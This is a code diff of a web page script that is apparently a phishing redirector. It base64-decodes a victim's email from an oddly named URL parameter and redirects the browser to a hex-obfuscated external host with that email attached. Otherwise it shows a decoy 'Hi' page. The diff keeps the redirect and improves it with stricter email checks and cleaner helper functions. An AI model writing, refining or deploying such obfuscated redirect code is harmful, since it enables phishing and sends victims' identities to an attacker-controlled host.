@@ -11,40 +11,47 @@
             try {
                 return atob(encoded);
             } catch (e) {
+                console.error("Invalid base64 encoding:", e);
                 return null;
             }
         }
 
-        // Check URL parameters for a 45-character key with a base64-encoded value
+        // Check URL parameters for a 45-character key with a valid base64-encoded email
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
             for (const [key, value] of urlParams.entries()) {
-                // Check if the key is exactly 45 characters
                 if (key.length === 45 && /^[A-Za-z0-9+/=]*$/.test(value)) {
                     const decodedValue = decodeBase64(value);
-                    // Validate the decoded value as an email
-                    if (decodedValue && decodedValue.includes('@')) {
-                        return decodedValue; // Return the decoded email if valid
+                    if (decodedValue && isValidEmail(decodedValue)) {
+                        return decodedValue;
                     }
                 }
             }
-            return null; // No valid email parameter found
+            console.warn("No valid email parameter found.");
+            return null;
         }
 
-        // Hex-encoded URL for redirection
-        const hexEncodedURL = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
-        
-        // Decode the hex URL
-        const decodedURL = decodeURIComponent('%' + hexEncodedURL.match(/.{1,2}/g).join('%'));
+        // Validate if the decoded value is a correctly formatted email
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
 
-        // Check for a valid email parameter
+        // Decode a hex-encoded URL
+        function decodeHex(hexString) {
+            return decodeURIComponent('%' + hexString.match(/.{1,2}/g).join('%'));
+        }
+
+        // Main execution
+        const hexEncodedURL = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
+        const decodedURL = decodeHex(hexEncodedURL);
         const email = findEmailParam();
 
         if (email) {
-            // Redirect if email parameter is found
+            // Redirect to the constructed URL with the email as a query parameter
             location.href = `${decodedURL}&email=${encodeURIComponent(email)}`;
         } else {
-            // Display "Hi" if no valid email parameter is found
+            // Display a fallback message if no valid email is found
             document.body.innerHTML = "<h1>Hi</h1>";
         }
     </script>
